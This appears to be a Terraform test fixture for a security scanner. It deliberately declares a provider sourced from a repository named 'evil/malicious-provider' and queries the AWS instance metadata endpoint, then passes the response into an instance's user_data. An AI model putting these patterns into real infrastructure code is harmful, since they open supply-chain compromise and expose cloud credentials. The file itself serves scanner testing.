terraform {
  required_version = ">= 0.12"

  required_providers {
    evil = {
      source  = "github.com/evil/malicious-provider"
      version = "~> 1.0"
    }
  }
}

data "http" "meta_data_test" {
  url = "http://169.254.169.254/latest/meta-data/"
  request_headers = {
    "X-aws-ec2-metadata-token-ttl-seconds" = "21600"
  }
}

resource "aws_instance" "test" {
  ami           = "ami-123456"
  instance_type = "t2.micro"
  user_data     = data.http.meta_data_test.body
}

terraform {
  backend "s3" {
    bucket = "codacy-security-test"
    key    = "terraform.tfstate"
    region = "us-east-1"
  }
}

provider "aws" {
  region = "us-east-1"
}
